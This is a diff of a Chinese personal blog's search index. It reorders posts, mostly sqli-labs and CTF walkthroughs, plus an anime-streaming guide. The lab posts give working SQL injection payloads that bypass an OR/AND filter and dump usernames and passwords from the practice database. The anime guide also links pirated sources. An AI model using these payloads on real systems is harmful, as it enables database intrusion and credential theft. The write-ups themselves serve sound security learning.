-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_25+25a</title>
-    <url>/2022/11/17/sqli-labs_25+25a/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
-</ol>
-<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
-<ol start="2">
-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>爆出显示位</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -3166,42 +3175,6 @@ right(has:str)：传入一个字符串，返回一个新字符串。新字符串
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_3</title>
-    <url>/2022/11/08/sqli-labs_3/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
-</li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
-<ol start="3">
-<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
-<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
-<li>此笔记为笔者初学sql注入时所写</li>
-<li>本关重点在于通过报错信息判断sql语句</li>
-</ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_29-31</title>
     <url>/2022/11/17/sqli-labs_29-31/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又出了个新花样</p>
@@ -3236,6 +3209,42 @@ right(has:str)：传入一个字符串，返回一个新字符串。新字符串
 <h2 id="第30关"><a href="#第30关" class="headerlink" title="第30关"></a>第30关</h2><p>与第29关差不多，只是闭合方式从’变更为”</p>
 <h2 id="第31关"><a href="#第31关" class="headerlink" title="第31关"></a>第31关</h2><p>与第29关差不多，只是闭合方式从”变更为”)</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是，知道怎么做，注入方式就那几样，常规注入，报错注入，布尔盲注，时间盲注，抓包注入…</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_3</title>
+    <url>/2022/11/08/sqli-labs_3/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
+<ol start="3">
+<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
+<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>此笔记为笔者初学sql注入时所写</li>
+<li>本关重点在于通过报错信息判断sql语句</li>
+</ul>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -4243,6 +4252,119 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>如何寻觅动画</title>
+    <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
+    <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喜欢动画的人必不可少的，就是寻找能看动画的优质资源，本篇我就来梳理一下如何寻找动画资源，以我看番两年的经历来说说。字幕主要是（简中&amp;繁中）</p>
+<h1 id="动画资源"><a href="#动画资源" class="headerlink" title="动画资源"></a>动画资源</h1><h2 id="正版资源"><a href="#正版资源" class="headerlink" title="正版资源"></a>正版资源</h2><ol>
+<li><strong>bilibili港澳台区</strong><br>优点：</li>
+</ol>
+<ul>
+<li>资源比较多，不用到处找</li>
+<li>有弹幕和评论区，有分享的地方</li>
+<li>除了独家代理，其它都可以免费观看<br>缺点：</li>
+<li>在1080p资源中画质算是比较差的，压缩比较大</li>
+<li>字幕样式比较丑，略影响观看</li>
+<li>老番资源较少</li>
+</ul>
+<p>使用方式：<br>手机端：需要港澳台版的app，并设置代理(特指安卓，iphone不清楚)<br>电脑端：需要将设备地区设置为台湾(特指Windows 10，其它不清楚)<br>如果能用大陆代理，老番资源还是比较多的，无删改的可以看看，由于经常搞活动，会员价很便宜。<br>(活动)会员价：8刀&#x2F;年<br><a href="https://www.bilibili.com/">bilibili港澳台</a></p>
+<ol start="2">
+<li><strong>巴哈姆特动画疯</strong><br>优点：</li>
+</ol>
+<ul>
+<li>绝大部分资源可以免费看。但需要等待30s广告，画质最高只有720p</li>
+<li>资源比较多，不用到处找</li>
+<li>有弹幕，可以分享</li>
+<li>相较于bilibili港澳台大部分画质更佳</li>
+<li>很多时候op，ed歌词都有翻译<br>缺点：</li>
+<li>会员费较贵</li>
+<li>弹幕素质较低，需要自设屏蔽词，比较麻烦</li>
+<li>有时字幕过大，略影响观看</li>
+<li>老番资源较少</li>
+</ul>
+<p>使用方式：<br>手机端：设置台湾地区代理，下载动画疯app<br>电脑端：设置台湾地区代理，打开动画疯网址<br>会员价：36刀&#x2F;年。新年买半年或一年可以加送1个月<br><a href="https://ani.gamer.com.tw/">动画疯</a></p>
+<ol start="3">
+<li><strong>Netflix</strong><br>优点：</li>
+</ol>
+<ul>
+<li>画质好，没得说</li>
+<li>资源也比较多</li>
+<li>有自制动画。如：恶魔人，赛博朋克</li>
+<li>可以跳过op和ed<br>缺点：</li>
+<li>新番资源少</li>
+<li>对代理的要求比较高</li>
+</ul>
+<p>使用方式：<br>手机端：设置代理，下载Netflix app<br>电脑端：设置代理，打开网页或下载UMP（UMP也需要代理）<br>(合租)会员价：27刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.netflix.com/">Netflix</a></p>
+<ol start="4">
+<li><strong>Disney+</strong><br>优点：<br>画质高<br>缺点：<br>资源少<br>新番不能及时更新</li>
+</ol>
+<p>观看方式：<br>手机端：购买会员，下载app<br>电脑端：购买会员，打开网站<br>(合租)会员价：13刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.disneyplus.com/">Disney+</a></p>
+<ol start="5">
+<li><strong>Yahoo TV</strong><br>优点：<br>免费的1080p新番木棉花资源<br>缺点：<br>资源少<br>只有台湾地区有</li>
+</ol>
+<p>观看方式：<br>电脑端：代理至台湾，打开网站<br>手机端：本人未成功过<br><a href="https://tw.tv.yahoo.com/">YahooTV</a></p>
+<ol start="6">
+<li><strong>YouTube</strong></li>
+</ol>
+<ul>
+<li>Ani-One 频道(最好在Singapore)<br>优点：<br>免费的1080p资源<br>有评论区<br>缺点：<br>资源少<br>少部分要频道会员</li>
+</ul>
+<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上</p>
+<p>还没有看过<strong>神之动画</strong>的快来看！</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/2C7Kp0yBpvo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+<p><a href="https://www.youtube.com/c/AniOneAsia">Ani-One频道</a></p>
+<ul>
+<li>木棉花 频道(最好在Taiwan)<br>优点：<br>免费的720p资源，直播时可有1080p<br>有评论区，直播时有实时评论<br>缺点：<br>资源少</li>
+</ul>
+<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上<br><a href="https://www.youtube.com/c/AniOneAsia">木棉花台湾</a></p>
+<ol start="7">
+<li><strong>AcFun</strong><br>优点：<br>免费的1080p资源<br>有b站没有的资源（如物语系列，摇曳露营）<br>有评论区和弹幕<br>缺点：<br>资源少</li>
+</ol>
+<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可<br><a href="https://www.acfun.cn/">AcFun</a></p>
+<ol start="8">
+<li><strong>mewatch</strong><br>优点：<br>免费的1080p资源<br>缺点：<br>资源数较少</li>
+</ol>
+<p>观看方式：<br>电脑端：换到新加坡代理，打开网站即可<br><a href="https://www.mewatch.sg/series/anime">mewatch</a></p>
+<h2 id="非正版资源"><a href="#非正版资源" class="headerlink" title="非正版资源"></a>非正版资源</h2><ol>
+<li><strong>Telegram</strong></li>
+</ol>
+<ul>
+<li>NEP.Anime 频道<br>优点：<br>免费观看以及下载<br>收录了几乎从2018年末到现在的大部分资源<br>有小众资源<br>缺点：<br>2018年以前的资源很少</li>
+</ul>
+<p><a href="https://t.me/AnimeNep">NEP.Anime</a></p>
+<ul>
+<li>NC.Raws 频道<br>优点：<br>免费观看以及下载<br>新番一般时间延迟在10分钟内就有资源<br>资源质量偏高<br>有小众资源<br>缺点：<br>2021年以前的资源很少</li>
+</ul>
+<p><a href="https://t.me/NC_Raws_Channel">NC.Raws</a></p>
+<ul>
+<li>ANI 频道<br>优点：<br>免费观看以及下载<br>新番一般延迟在10分钟内就有资源<br>缺点：<br>需要下载观看，视网速快慢等待时间</li>
+</ul>
+<p><a href="https://t.me/channel_ani">ANI</a></p>
+<p>观看方式：<br>手机端：下载Telegram，并搜索频道<br>电脑端：同上</p>
+<ol start="2">
+<li><strong>Age网站</strong><br>优点：<br>资源比较多<br>站内有分类，有人气排名<br>缺点：<br>画质不一定好<br>有广告</li>
+</ol>
+<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可</p>
+<p><a href="https://www.agemys.net/">AGE</a></p>
+<ol start="3">
+<li><strong>bt网站</strong><br>优点：<br>资源多<br>画质有的很好<br>缺点：<br>需要媒介下载后才能观看（比如迅雷，bit彗星），视情况等待时间较长</li>
+</ol>
+<p><a href="https://btbtt16.com/forum-index-fid-981-page-1.htm">BT动漫</a><br><a href="https://dongmanhuayuan.myheartsite.com/">动漫花园资源网</a></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然使用非正版资源有时比正版资源还好，但我个人还是建议有足够经济能力的人至少为一个正版平台付费吧，也算是为动画行业添砖加瓦。尽管只有绵薄之力，本人也是在两个平台上付了年费的。<br>会为网络设置代理很重要，不仅是大陆地区。因为有些平台的资源是限制了在某个地区的。<br>有些平台并没有每个地区都尝试过，如果某个地区没有想要的资源请更换地区。(代理一般选择<strong>新加坡，台湾，香港，马来西亚</strong>)<br>注意本文的时效性：2022.11，后续有任何改变并不知晓。</p>
+]]></content>
+      <categories>
+        <category>动画</category>
+        <category>资源</category>
+      </categories>
+      <tags>
+        <tag>动画</tag>
+        <tag>资源</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>代码审计期末专题</title>
     <url>/2023/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考试即将到来，复习刻不容缓。复习题由某群友整理得到。</p>
@@ -4579,123 +4701,11 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
 ]]></content>
       <categories>
-        <category>动画，孤独摇滚</category>
+        <category>动画</category>
+        <category>孤独摇滚</category>
       </categories>
       <tags>
         <tag>孤独摇滚</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何寻觅动画</title>
-    <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
-    <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喜欢动画的人必不可少的，就是寻找能看动画的优质资源，本篇我就来梳理一下如何寻找动画资源，以我看番两年的经历来说说。字幕主要是（简中&amp;繁中）</p>
-<h1 id="动画资源"><a href="#动画资源" class="headerlink" title="动画资源"></a>动画资源</h1><h2 id="正版资源"><a href="#正版资源" class="headerlink" title="正版资源"></a>正版资源</h2><ol>
-<li><strong>bilibili港澳台区</strong><br>优点：</li>
-</ol>
-<ul>
-<li>资源比较多，不用到处找</li>
-<li>有弹幕和评论区，有分享的地方</li>
-<li>除了独家代理，其它都可以免费观看<br>缺点：</li>
-<li>在1080p资源中画质算是比较差的，压缩比较大</li>
-<li>字幕样式比较丑，略影响观看</li>
-<li>老番资源较少</li>
-</ul>
-<p>使用方式：<br>手机端：需要港澳台版的app，并设置代理(特指安卓，iphone不清楚)<br>电脑端：需要将设备地区设置为台湾(特指Windows 10，其它不清楚)<br>如果能用大陆代理，老番资源还是比较多的，无删改的可以看看，由于经常搞活动，会员价很便宜。<br>(活动)会员价：8刀&#x2F;年<br><a href="https://www.bilibili.com/">bilibili港澳台</a></p>
-<ol start="2">
-<li><strong>巴哈姆特动画疯</strong><br>优点：</li>
-</ol>
-<ul>
-<li>绝大部分资源可以免费看。但需要等待30s广告，画质最高只有720p</li>
-<li>资源比较多，不用到处找</li>
-<li>有弹幕，可以分享</li>
-<li>相较于bilibili港澳台大部分画质更佳</li>
-<li>很多时候op，ed歌词都有翻译<br>缺点：</li>
-<li>会员费较贵</li>
-<li>弹幕素质较低，需要自设屏蔽词，比较麻烦</li>
-<li>有时字幕过大，略影响观看</li>
-<li>老番资源较少</li>
-</ul>
-<p>使用方式：<br>手机端：设置台湾地区代理，下载动画疯app<br>电脑端：设置台湾地区代理，打开动画疯网址<br>会员价：36刀&#x2F;年。新年买半年或一年可以加送1个月<br><a href="https://ani.gamer.com.tw/">动画疯</a></p>
-<ol start="3">
-<li><strong>Netflix</strong><br>优点：</li>
-</ol>
-<ul>
-<li>画质好，没得说</li>
-<li>资源也比较多</li>
-<li>有自制动画。如：恶魔人，赛博朋克</li>
-<li>可以跳过op和ed<br>缺点：</li>
-<li>新番资源少</li>
-<li>对代理的要求比较高</li>
-</ul>
-<p>使用方式：<br>手机端：设置代理，下载Netflix app<br>电脑端：设置代理，打开网页或下载UMP（UMP也需要代理）<br>(合租)会员价：27刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.netflix.com/">Netflix</a></p>
-<ol start="4">
-<li><strong>Disney+</strong><br>优点：<br>画质高<br>缺点：<br>资源少<br>新番不能及时更新</li>
-</ol>
-<p>观看方式：<br>手机端：购买会员，下载app<br>电脑端：购买会员，打开网站<br>(合租)会员价：13刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.disneyplus.com/">Disney+</a></p>
-<ol start="5">
-<li><strong>Yahoo TV</strong><br>优点：<br>免费的1080p新番木棉花资源<br>缺点：<br>资源少<br>只有台湾地区有</li>
-</ol>
-<p>观看方式：<br>电脑端：代理至台湾，打开网站<br>手机端：本人未成功过<br><a href="https://tw.tv.yahoo.com/">YahooTV</a></p>
-<ol start="6">
-<li><strong>YouTube</strong></li>
-</ol>
-<ul>
-<li>Ani-One 频道(最好在Singapore)<br>优点：<br>免费的1080p资源<br>有评论区<br>缺点：<br>资源少<br>少部分要频道会员</li>
-</ul>
-<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上</p>
-<p>还没有看过<strong>神之动画</strong>的快来看！</p>
-<iframe width="560" height="315" src="https://www.youtube.com/embed/2C7Kp0yBpvo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-<p><a href="https://www.youtube.com/c/AniOneAsia">Ani-One频道</a></p>
-<ul>
-<li>木棉花 频道(最好在Taiwan)<br>优点：<br>免费的720p资源，直播时可有1080p<br>有评论区，直播时有实时评论<br>缺点：<br>资源少</li>
-</ul>
-<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上<br><a href="https://www.youtube.com/c/AniOneAsia">木棉花台湾</a></p>
-<ol start="7">
-<li><strong>AcFun</strong><br>优点：<br>免费的1080p资源<br>有b站没有的资源（如物语系列，摇曳露营）<br>有评论区和弹幕<br>缺点：<br>资源少</li>
-</ol>
-<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可<br><a href="https://www.acfun.cn/">AcFun</a></p>
-<ol start="8">
-<li><strong>mewatch</strong><br>优点：<br>免费的1080p资源<br>缺点：<br>资源数较少</li>
-</ol>
-<p>观看方式：<br>电脑端：换到新加坡代理，打开网站即可<br><a href="https://www.mewatch.sg/series/anime">mewatch</a></p>
-<h2 id="非正版资源"><a href="#非正版资源" class="headerlink" title="非正版资源"></a>非正版资源</h2><ol>
-<li><strong>Telegram</strong></li>
-</ol>
-<ul>
-<li>NEP.Anime 频道<br>优点：<br>免费观看以及下载<br>收录了几乎从2018年末到现在的大部分资源<br>有小众资源<br>缺点：<br>2018年以前的资源很少</li>
-</ul>
-<p><a href="https://t.me/AnimeNep">NEP.Anime</a></p>
-<ul>
-<li>NC.Raws 频道<br>优点：<br>免费观看以及下载<br>新番一般时间延迟在10分钟内就有资源<br>资源质量偏高<br>有小众资源<br>缺点：<br>2021年以前的资源很少</li>
-</ul>
-<p><a href="https://t.me/NC_Raws_Channel">NC.Raws</a></p>
-<ul>
-<li>ANI 频道<br>优点：<br>免费观看以及下载<br>新番一般延迟在10分钟内就有资源<br>缺点：<br>需要下载观看，视网速快慢等待时间</li>
-</ul>
-<p><a href="https://t.me/channel_ani">ANI</a></p>
-<p>观看方式：<br>手机端：下载Telegram，并搜索频道<br>电脑端：同上</p>
-<ol start="2">
-<li><strong>Age网站</strong><br>优点：<br>资源比较多<br>站内有分类，有人气排名<br>缺点：<br>画质不一定好<br>有广告</li>
-</ol>
-<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可</p>
-<p><a href="https://www.agemys.net/">AGE</a></p>
-<ol start="3">
-<li><strong>bt网站</strong><br>优点：<br>资源多<br>画质有的很好<br>缺点：<br>需要媒介下载后才能观看（比如迅雷，bit彗星），视情况等待时间较长</li>
-</ol>
-<p><a href="https://btbtt16.com/forum-index-fid-981-page-1.htm">BT动漫</a><br><a href="https://dongmanhuayuan.myheartsite.com/">动漫花园资源网</a></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然使用非正版资源有时比正版资源还好，但我个人还是建议有足够经济能力的人至少为一个正版平台付费吧，也算是为动画行业添砖加瓦。尽管只有绵薄之力，本人也是在两个平台上付了年费的。<br>会为网络设置代理很重要，不仅是大陆地区。因为有些平台的资源是限制了在某个地区的。<br>有些平台并没有每个地区都尝试过，如果某个地区没有想要的资源请更换地区。(代理一般选择<strong>新加坡，台湾，香港，马来西亚</strong>)<br>注意本文的时效性：2022.11，后续有任何改变并不知晓。</p>
-]]></content>
-      <categories>
-        <category>动画</category>
-        <category>资源</category>
-      </categories>
-      <tags>
-        <tag>动画</tag>
-        <tag>资源</tag>
       </tags>
   </entry>
   <entry>
@@ -4959,26 +4969,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-baby_web</title>
-    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
-</li>
-<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界-file_include</title>
     <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p>
@@ -5012,6 +5002,26 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-baby_web</title>
+    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
+</li>
+<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -5364,48 +5374,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>时间盲注</title>
-    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
